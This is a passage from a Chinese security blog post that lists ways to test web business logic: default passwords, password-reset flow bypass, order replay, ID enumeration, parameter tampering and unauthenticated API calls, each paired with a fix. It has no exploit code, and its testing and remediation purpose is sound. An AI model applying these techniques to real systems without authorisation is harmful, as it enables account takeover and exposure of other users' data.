+<p><strong>万能密码 000000  888888</strong></p>
+<p><strong>密码找回流程绕过测试</strong><br>三个步骤<br>一 用户输入找回密码的账号<br>二 效验凭证<br>三 效验成功进入重置密码页面 主要是绕过第二步 直接进入重置密码页面</p>
+<ul>
+<li>测试流程<br>通过自己账号正常走一遍流程 记录下输入用户账号页面 验证身份页面 设置新 密码页面的URL 尝试在第一步输入账号后进入第二步页面 在这个 页面改成设置新密码页面 看是否能成功 <ul>
+<li>修复建议 ：</li>
+<li>在后端逻辑效验中确认上一步流程完成<h3 id="业务接口调用模块测试"><a href="#业务接口调用模块测试" class="headerlink" title="业务接口调用模块测试"></a>业务接口调用模块测试</h3></li>
+</ul>
+</li>
+</ul>
+<p><strong>接口调用重放</strong></p>
+<ul>
+<li>在进行提交数据的时候 进行抓包 反复提交 看是 否能生成多个订单 </li>
+<li>修复建议：<br>对生成的订单环节采用验证码机制 防止生成数据 业务被恶意调用 每一个订单使用唯一的token 订单提交一次后 token失效</li>
+</ul>
+<p><strong>接口调用遍历</strong><br>Web接口一般将常见的一些功能需求进行封装 通过传入参数来获取数据 当看到有id uid的数据 可以进行遍历 看是否能查看到敏感数据</p>
+<ul>
+<li>测试流程<br>先爬虫 选出有ID UID等参数 在filter by search term 中打要查看的参数 找出请求 发送到攻击模 块 进行遍历 选输入敏感数据的参数 看是否能查 看其他人的数据</li>
+<li>修复建议：<br>在session中存储当前用户的凭证或则ID 只有传 入ID或session中的一致才返回数据内容</li>
+</ul>
+<p><strong>接口调用参数</strong></p>
+<ul>
+<li>在短信 邮件调用业务环节中 修改对应的手机号 或邮箱号 看能否收到邮件 可以的话证明接口调 用参数可以被修改 存在漏洞 </li>
+<li>修复建议：<br>会话session中 存在重要凭证 在重要接口中 从 session获取用户凭证 而不是客户端 在获取手机号 邮箱等信息 要与session中的凭证 进行对比 验证通过后才允许进行业务操作</li>
+</ul>
+<p><strong>接口未授权访问、调用</strong><br>在正常业务中敏感功能的接口需要对访问者的身 份进行验证 验证成功后才可以调用接口进行操 作 如果敏感功能接口没有身份认证 就存在这个 漏洞</p>
+<ul>
+<li>测试流程<br>进行信息收集 爬虫 选出敏感信息的URL 使用 MIME type过滤功能关注json script xml text 过 滤js gif jpg png css等信息 找出来后 换浏览器 直接复制URL看是否能查看 </li>
+<li>修复建议<br>采用token效验 在URL中添加一个token参数 只 有token验证通过才返回接口数据且token使用一 次后失效 在接口被调用时 后端对会话状态进行验证 如果 登录 就返回数据 如果未登录 就返回错误信息</li>
+</ul>
+<p><strong>其他补充</strong><br>Callback测试 关于同源策略 使用bp测试 Webservice 跟callback测试相同 找出关键接口进行测试</p>
+</div><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">秋兮成風</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://yoursite.com/2021/04/03/web%E5%AE%89%E5%85%A8%E6%95%B4%E7%90%86/">http://yoursite.com/2021/04/03/web%E5%AE%89%E5%85%A8%E6%95%B4%E7%90%86/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"/><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/04/04/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"><img class="prev-cover" data-src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">内网信息收集</div></div></a></div><div class="next-post pull-right"><a href="/2020/06/03/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"><img class="next-cover" data-src="/img/wenjian.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">文件上传</div></div></a></div></nav></article></main><footer id="footer" style="background-image: url(https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg)" data-type="photo"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By 秋兮成風</div><div class="framework-info"><span>Driven </span><a href="https://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme </span><a href="https://github.com/jerryc127/hexo-theme-butterfly" target="_blank" rel="noopener"><span>Butterfly</span></a></div></div></footer></div><section class="rightside" id="rightside"><div id="rightside-config-hide"><button id="readmode" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="font_plus" title="Increase Font Size"><i class="fas fa-plus"></i></button><button id="font_minus" title="Decrease Font Size"><i class="fas fa-minus"></i></button><button class="translate_chn_to_cht" id="translateLink" title="Switch Between Traditional Chinese And Simplified Chinese">繁</button><button id="darkmode" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button></div><div id="rightside-config-show"><button id="rightside_config" title="Setting"><i class="fas fa-cog"></i></button><button class="close" id="mobile-toc-button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></section><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="/js/third-party/activate-power-mode.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+document.body.addEventListener('input', POWERMODE);
+</script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module" defer></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js" async></script><script src="/js/third-party/click_heart.js"></script><script>var endLoading = function () {
+  document.body.style.overflow = 'auto';
+  document.getElementById('loading-box').classList.add("loaded")
+}
+window.addEventListener('load',endLoading)</script></body></html>
